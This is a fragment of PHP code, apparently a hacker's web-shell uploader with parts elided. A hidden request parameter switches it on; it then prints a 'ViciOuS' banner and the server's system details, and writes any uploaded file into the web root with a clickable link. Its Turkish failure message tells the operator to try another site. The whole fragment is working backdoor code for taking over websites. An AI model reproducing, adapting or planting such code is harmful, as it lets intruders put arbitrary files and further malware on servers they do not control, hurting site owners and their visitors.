...
if(@$_REQUEST["chip"]== 'mb')
{
echo '<b>ViciOuS<br><br>'.php_uname().'<br></b>';
...
echo $fullpath;
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";}
else { echo '<b>babacan olmadi baska site dene! </b><br><br>'; }
}
}
